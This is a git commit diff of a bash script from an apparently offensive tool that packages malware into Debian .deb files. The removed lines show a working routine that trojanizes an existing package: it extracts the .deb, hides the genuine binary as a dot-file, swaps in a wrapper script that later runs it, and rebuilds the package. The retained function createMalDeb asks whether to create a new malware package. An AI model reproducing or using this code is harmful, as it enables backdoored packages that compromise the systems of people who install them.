bcf3e71540b1cf6d33a9c39710252bebdff95f28
Victory Osikwemhe <zombieleetnca@gmail.com>
2016-12-19 00:01:35 +0100

    Source fromPakcage.sh to automatically create a deb file from malware

--- misc/debpackage.sh
+++ misc/debpackage.sh
@@ -1,7 +1,6 @@
 # Create a Debpackage
 
 
-source ${PWD}/misc/malware.sh
 control(){
     while read line;do
 	$line
@@ -14,8 +13,8 @@ echo Description: $description
 EOF
 }
 
-
 createMalDeb() {
+    
     while printf "\n${open}${light}${green}Create a new %s package for the Malware?[y|n]: ${close}" \
 		 "${pPackage}"; \
 	  read $opt -e inmissile
@@ -29,7 +28,7 @@ createMalDeb() {
 			
 			mkdir "$malwareDir"
 			
-			cd "$_"
+			cd "${malwareDir}"
 			
 			mkdir -p usr/local/bin && mkdir DEBIAN
 			cd usr/local/bin
@@ -63,72 +62,15 @@ createMalDeb() {
 			break
 			;;
 	    n|N)
-		while :;do
-		    printf "${open}${bold}${green}%s${close}" \
-			   "Specify the package to attach malware too: " ; read -e attachToPackage
-		    printf "\n"
-		    
-		    [[ -z "${attachToPackage}" ]] && continue # Check if attachToPackage is null
-		    
-		    # The file command will show you the type of file $attachToPackage is
-		    local checkIfDeb=$(file $attachToPackage)  
+		
+		makeFromPackage
+		status=$?
+		if (( status == 0 ));then
+		    return 0;
+		fi
 
-		    if [[ "${checkIfDeb}" =~ "Debian binary package" ]];then
-			
-			# Extract the debian pacakage in the current directory
-			dpkg-deb --raw-extract "${attachToPackage}" . 
+	    ;;
 
-			# extract the name of the pacakge
-			packageName="${attachToPackage%%_*}"
-			
-			# move into the /usr/bin folder of the package
-			
-			if [[ -d "${PWD}/usr/bin/" ]];then
-			    cd "${PWD}/usr/bin/"
-			    dirfile="tempScript.sh"
-
-			    # rename the packageName tto a . file so it will be hidden
-			    mv "${packageName}" ".${packageName}"
-			    # Put the package name in the last end of the script
-			    
-			    echo "/usr/bin/.${packageName}" >> "${dirfile}"
-			    chk_file
-			    mv ${dirfile%%.*} "${packageName}"
-			    cd -
-			    mkdir ${attachToPackage%.deb*}
-			    mv DEBIAN usr/ ${attachToPackage%.deb*}
-			    dpkg --build ${attachToPackage%.deb*} 1>/dev/null 
-			    local status=$?
-			    
-			    (( status != 0 )) && {
-				
-				rm -rf ${attachToPackage%.deb*}
-				printf "${open}${bold}${red}%s${close}\n" \
-				       "Fatal Error While packaging ${attachToPackage%.deb*}"
-				return 1;
-				
-			    }
-			    
-			    rm -rf ${attachToPackage%.deb*}
-			    return 0;
-			    
-			fi
-
-			
-			printf "${open}${bold}${yellow}%s{close}\n" \
-			       "[!]${attachToPackage} does not have a usr/bin directory"
-			exit 2
-			    
-			
-			
-		    fi
-		    
-		    printf "${open}${bold}${yellow}%s${close}\n" "[!]${attachToPackage} is not a debian package"
-		    
-		    continue ;
-		done
-		      
-		;;
 	    *)
 		printf "${open}${light}${red}%s${close}" "Invalid Response" && continue ;;
 	esac
